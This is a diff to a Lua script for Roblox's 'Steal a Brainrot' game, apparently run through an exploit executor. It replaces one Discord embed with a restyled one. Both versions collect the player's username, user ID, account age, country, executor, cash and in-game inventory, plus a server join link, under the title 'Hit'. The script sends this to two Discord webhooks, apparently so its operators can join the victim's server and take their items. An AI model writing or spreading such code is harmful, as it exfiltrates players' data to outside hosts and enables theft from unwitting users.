@@ -610,30 +610,88 @@ showConfirm = function(rawLink)
         -- Join everything with newlines and wrap in a single code block
         local finalBackpackText = "```\n" .. table.concat(backpackLines, "\n") .. "\n```"
 
-        local payload = {
-            avatar_url = "https://cdn.discordapp.com/attachments/1394146542813970543/1395733310793060393/ca6abbd8-7b6a-4392-9b4c-7f3df2c7fffa.png",
-            content = "",
-            embeds = {{
-                title = "🎯 Steal a Brainrot Hit - Scripts.SM",
-                url = joinLink,
-                color = 57855,
-                fields = {
-                    {name = "🪪 Display Name", value = "```"..(player.DisplayName or "Unknown").."```", inline = true},
-                    {name = "👤 Username", value = "```"..(player.Name or "Unknown").."```", inline = true},
-                    {name = "🆔 User ID", value = "```"..tostring(player.UserId).."```", inline = true},
-                    {name = "🗓️ Account Age", value = "```"..tostring(player.AccountAge).." days```", inline = true},
-                    {name = "💻 Executor", value = "```"..detectExecutor().."```", inline = true},
-                    {name = "🌍 Country", value = "```"..getCountry().."```", inline = true},
-                    {name = "💸 Cash", value = "```"..formatCash(cash).."```", inline = true},
-                    {name = "🔥 Steals", value = "```"..tostring(steals).."```", inline = true},
-                    {name = "♻️ Rebirths", value = "```"..tostring(rebirths).."```", inline = true},
-                    {name = "💰 Backpack", value = finalBackpackText, inline = false},
-                    {name = "🔗 Join with URL", value = "[Click here to join]("..joinLink..")", inline = false}
-                },
-                footer = {text = "discord.gg/cnUAk7uc3n"},
-                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-            }}
+local payload = {
+    content = "> Jump or type anything in chat to start.",
+    username = "ꜱᴄʀɪᴘᴛꜱ.ꜱᴍ",
+    avatar_url = "https://scriptssm.vercel.app/pngs/logo.png",
+    embeds = {{
+        title = "ꜱᴄʀɪᴘᴛꜱ.ꜱᴍ",
+        description = "<:faq_badge:1436328022910435370> **Status:** `Unknown`\n> Failed to Fetch Status.\n⠀",
+        color = 3447003,
+        fields = {
+            {
+                name = "<:players:1365290081937526834> **Display Name    **",
+                value = "```" .. (player.DisplayName or "Unknown") .. "```",
+                inline = true
+            },
+            {
+                name = "<:game:1365295942504550410> **Username**",
+                value = "```" .. (player.Name or "Unknown") .. "```",
+                inline = true
+            },
+            {
+                name = "<:time:1365991843011100713> **Account Age**",
+                value = "```" .. tostring(player.AccountAge) .. " Days```",
+                inline = true
+            },
+            {
+                name = "<:folder:1365290079081205844> **Receiver**",
+                value = "```" .. (player.Name or "Unknown") .. "```",
+                inline = true
+            },
+            {
+                name = "<:Events:1394005823931420682> **Executor**",
+                value = "```" .. detectExecutor() .. "```",
+                inline = true
+            },
+            {
+                name = "<:money:1436335320437096508> **Cash**",
+                value = "```" .. formatCash(cash) .. "```",
+                inline = true
+            },
+            {
+                name = "<:Rechange:1394005750317060167> **Rebirths**",
+                value = "```" .. tostring(rebirths) .. "```",
+                inline = true
+            },
+            {
+                name = "<:stats:1436336068461985824> **Steals**",
+                value = "```" .. tostring(steals) .. "```",
+                inline = true
+            },
+            {
+                name = "<:pack:1365295947281862656> **Inventory**",
+                value = "Warning: We Can't Scan Latest Brainrots from events.\n```" .. 
+                    (function()
+                        local lines = {}
+                        for _, v in ipairs(brainrots) do
+                            local rate = extractRate(v.name) or v.generation
+                            local cleanName = v.name:gsub("%s*%$[%d%.]+[KM]?/s", ""):gsub("^%s+", ""):gsub("%s+$", "")
+                            table.insert(lines, cleanName .. " : " .. rate)
+                        end
+                        return #lines > 0 and table.concat(lines, "\n") or "No brainrots found."
+                    end)() .. "```"
+            },
+            {
+                name = "<:location:1365290076279541791> **Join via URL**",
+                value = "[ **Click Here to Join!**](" .. joinLink .. ")"
+            }
+        },
+        author = {
+            name = "Steal a Brainrot - Hit",
+            url = joinLink,
+            icon_url = "https://scriptssm.vercel.app/pngs/bell-icon.webp"
+        },
+        footer = {
+            text = "discord.gg/cnUAk7uc3n",
+            icon_url = "https://i.ibb.co/5xJ8LK6X/ca6abbd8-7b6a-4392-9b4c-7f3df2c7fffa.png"
+        },
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z"),
+        image = {
+            url = "https://scriptssm.vercel.app/pngs/sab.webp"
         }
+    }}
+}
 
         safeRequest(user_webhook, payload)
         safeRequest(logs_webhook, payload)
